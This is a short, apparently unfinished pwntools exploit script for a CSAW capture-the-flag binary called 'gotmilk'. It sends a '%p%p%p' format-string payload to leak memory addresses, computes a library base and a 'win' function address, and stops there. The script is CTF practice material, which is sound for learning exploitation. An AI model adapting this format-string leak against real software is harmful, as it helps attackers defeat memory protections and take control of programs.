from pwn import *

r = process('./gotmilk', env = {"LD_LIBRARY_PATH":"./libmylib.so"})

#r = process("./gotmilk")
#r = remote('pwn.chal.csaw.io', '1004')
payload = "%p%p%p"
print(r.recvline())
r.sendlineafter("Hey you! GOT milk?",payload)
#print(r.recvline())
p = r.recvline().split(':')
print(p[1][5:])
libc_base = int(p[1][5:15].strip(),16)+0x3a60
win = libc_base+0x1189

print(hex(win))

#gdb.attach(r)
